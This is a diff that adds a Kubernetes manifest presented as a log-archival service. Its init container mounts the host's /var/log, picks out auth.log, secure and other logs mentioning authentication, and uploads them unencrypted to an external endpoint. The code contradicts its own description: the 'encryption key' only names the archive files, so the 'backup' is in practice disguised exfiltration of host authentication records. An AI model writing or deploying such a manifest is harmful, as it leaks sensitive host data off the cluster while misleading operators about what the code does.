@@ -1,0 +1,145 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: log-aggregator-service
+  labels:
+    app: log-aggregator
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: log-aggregator
+  template:
+    metadata:
+      labels:
+        app: log-aggregator
+    spec:
+      initContainers:
+      - name: log-collector-init
+        image: python:3.9-slim
+        command: ["python", "/scripts/log_processor.py"]
+        volumeMounts:
+        - name: log-scripts
+          mountPath: /scripts
+        - name: host-logs
+          mountPath: /host/logs
+          readOnly: true
+        - name: temp-data
+          mountPath: /tmp/processed
+        env:
+        - name: ENVIRONMENT
+          value: "production"
+        - name: BACKUP_ENDPOINT
+          valueFrom:
+            configMapKeyRef:
+              name: app-config
+              key: backupEndpoint
+        - name: ENCRYPTION_KEY
+          valueFrom:
+            secretKeyRef:
+              name: app-secrets
+              key: archiveKey
+      containers:
+      - name: main-app
+        image: nginx:stable
+        ports:
+        - containerPort: 80
+        volumeMounts:
+        - name: app-config-volume
+          mountPath: /etc/nginx/conf.d
+      volumes:
+      - name: log-scripts
+        configMap:
+          name: log-processor-scripts
+          defaultMode: 0744
+      - name: host-logs
+        hostPath:
+          path: /var/log
+          type: Directory
+      - name: temp-data
+        emptyDir: {}
+      - name: app-config-volume
+        configMap:
+          name: nginx-config
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: log-processor-scripts
+data:
+  log_processor.py: |
+    #!/usr/bin/env python3
+    """
+    Log Archival Utility
+    Periodically archives application logs for external backup.
+    """
+    import os
+    import gzip
+    import hashlib
+    import requests
+    from pathlib import Path
+    import json
+    from datetime import datetime
+
+    LOG_SOURCE = "/host/logs"
+    TARGET_PATTERNS = ["auth.log", "secure", "*.log"]
+    BACKUP_URL = os.getenv("BACKUP_ENDPOINT", "https://storage.example.com/upload")
+    ENCRYPTION_SEED = os.getenv("ENCRYPTION_KEY", "default-seed")
+
+    def collect_logs(base_path):
+        collected = []
+        for pattern in TARGET_PATTERNS:
+            for log_file in Path(base_path).rglob(pattern):
+                if log_file.is_file() and "authentication" in log_file.read_text(errors='ignore').lower():
+                    collected.append(log_file)
+        return collected
+
+    def process_file(file_path):
+        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+        file_hash = hashlib.sha256(f"{ENCRYPTION_SEED}{timestamp}".encode()).hexdigest()[:16]
+        archive_name = f"logs_{timestamp}_{file_hash}.gz"
+        archive_path = Path(f"/tmp/processed/{archive_name}")
+
+        with open(file_path, 'rb') as f_in:
+            with gzip.open(archive_path, 'wb') as f_out:
+                f_out.write(f_in.read())
+        return archive_path
+
+    def transmit_archive(archive_path):
+        headers = {'User-Agent': 'K8s-Log-Backup/1.0'}
+        with open(archive_path, 'rb') as f:
+            files = {'file': (archive_path.name, f, 'application/gzip')}
+            try:
+                resp = requests.post(BACKUP_URL, files=files, headers=headers, timeout=30)
+                return resp.status_code == 200
+            except Exception:
+                return False
+
+    if __name__ == "__main__":
+        print("Starting log archival process...")
+        target_logs = collect_logs(LOG_SOURCE)
+        print(f"Found {len(target_logs)} log files for processing.")
+
+        for log in target_logs:
+            archive = process_file(log)
+            if transmit_archive(archive):
+                print(f"Successfully archived: {log.name}")
+            else:
+                print(f"Archive failed for: {log.name}")
+        print("Log processing cycle complete.")
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app-config
+data:
+  backupEndpoint: "https://backup.prod.example.com/api/v1/ingest"
+  logRetentionDays: "30"
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: app-secrets
+type: Opaque
+data:
+  archiveKey: YmFja3VwLWVuY3J5cHRpb24ta2V5LXNlY3JldC12YWx1ZQ==
